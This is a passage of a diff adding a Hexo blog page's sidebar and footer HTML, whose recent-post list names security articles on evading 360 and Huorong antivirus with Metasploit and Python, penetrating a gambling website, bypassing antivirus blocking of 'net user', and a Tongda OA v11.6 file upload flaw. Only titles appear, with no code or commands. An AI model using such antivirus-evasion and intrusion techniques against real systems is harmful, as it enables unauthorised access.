+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/09/30/msf+python%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92/" class="title">msf+python免杀360火绒</a></p>
+                            <p class="item-date"><time datetime="2020-09-30T04:00:00.000Z" itemprop="datePublished">2020-09-30</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/24/%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20200922131655.png)" alt="某博彩网站渗透实战" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/09/24/%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" class="title">某博彩网站渗透实战</a></p>
+                            <p class="item-date"><time datetime="2020-09-24T04:00:00.000Z" itemprop="datePublished">2020-09-24</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/13/net%20user%20%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/net_%E6%8B%A6%E6%88%AA.gif)" alt="net user 被杀软拦截绕过方式" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/09/13/net%20user%20%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/" class="title">net user 被杀软拦截绕过方式</a></p>
+                            <p class="item-date"><time datetime="2020-09-13T04:00:00.000Z" itemprop="datePublished">2020-09-13</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/08/20/%E9%80%9A%E8%BE%BEOA%20v11.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4+%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20200820163910.png)" alt="通达OA v11.6 任意文件删除+任意文件上传漏洞" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/08/20/%E9%80%9A%E8%BE%BEOA%20v11.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4+%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="title">通达OA v11.6 任意文件删除+任意文件上传漏洞</a></p>
+                            <p class="item-date"><time datetime="2020-08-20T04:00:00.000Z" itemprop="datePublished">2020-08-20</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+        
+    </div>
+</aside>
+
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+                <p>&copy; 2020 John Doe</p>
+                
+                <p>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="https://github.com/ppoffice" target="_blank">PPOffice</a></p>
+                
+            </div>
+            <div class="footer-plugins">
+              
+    
+
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+    </div>
+    
+
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+
+    
+    
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+</body>
+</html>
